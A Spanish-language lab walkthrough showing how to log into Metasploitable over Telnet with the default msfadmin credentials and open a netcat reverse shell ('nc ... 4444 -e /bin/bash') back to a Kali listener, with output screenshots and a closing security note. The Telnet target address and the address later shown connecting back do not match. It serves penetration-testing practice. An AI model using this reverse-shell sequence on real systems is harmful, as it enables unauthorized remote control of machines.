# Reverse Shell desde Telnet usando Netcat

Una vez que logramos autenticarnos al servicio Telnet en Metasploitable (por ejemplo, con credenciales por defecto `msfadmin:msfadmin`), podemos usar esta conexión para establecer una **shell inversa (reverse shell)** y así obtener acceso remoto desde Kali Linux.

##  Objetivo
Obtener una shell desde Metasploitable hacia Kali utilizando Telnet y `netcat`, lo cual permite control total de la máquina víctima desde nuestra máquina atacante.

## 1. Escuchar en Kali Linux

En  Kali (IP: `192.168.171.132`), abrir un terminal y ejecutae el siguiente comando para que escuche en el puerto 4444:

```bash
nc -nlvp 4444
```

![image](https://github.com/user-attachments/assets/73722b5c-f29b-4041-9068-ef5ac6227b09)

## 2. Conectarse por Telnet a Metasploitable

Usando: 

```bash
telnet 192.168.222.131 23
```

Ingresa las credenciales cuando se soliciten:

Usuario: msfadmin
Contraseña: msfadmin

![image](https://github.com/user-attachments/assets/209c8336-3ef0-4883-be47-939486ca4121)

## 3. Ejecutar Reverse Shell desde Metasploitable

Una vez dentro del sistema remoto, ejecutar el siguiente comando desde la terminal del Telnet:

```bash
nc 192.168.171.132 4444 -e /bin/bash
```
Este comando hace que la máquina Metasploitable se conecte de regreso a Kali en el puerto 4444 y le entregue una shell /bin/bash.

![image](https://github.com/user-attachments/assets/fbf4659b-b85e-43cd-970d-0b438c54356a)

## 4. Verificar en Kali

Si todo funciona correctamente, se vera algo como esto en la terminal de Kali:
```bash
listening on [any] 4444 ...
connect to [192.168.171.132] from (UNKNOWN) [192.168.171.133] 49872
```
![image](https://github.com/user-attachments/assets/5c2897ac-aaf0-4292-b215-ccc59a1308ea)

Ahora se podra ejecutar:

```bash
whoami
uname -a
```
![image](https://github.com/user-attachments/assets/98f50d79-5af7-49b1-9ee4-c9be7e5701dd)

## 5. Conclusión

Este método permite escalar el acceso simple por Telnet a una shell interactiva con Netcat, facilitando un control más completo sobre la máquina comprometida.

🛑 Nota de seguridad: Esta técnica demuestra lo peligroso que es tener Telnet habilitado sin medidas de seguridad adecuadas. El uso de -e /bin/bash en Netcat está considerado una vulnerabilidad crítica.
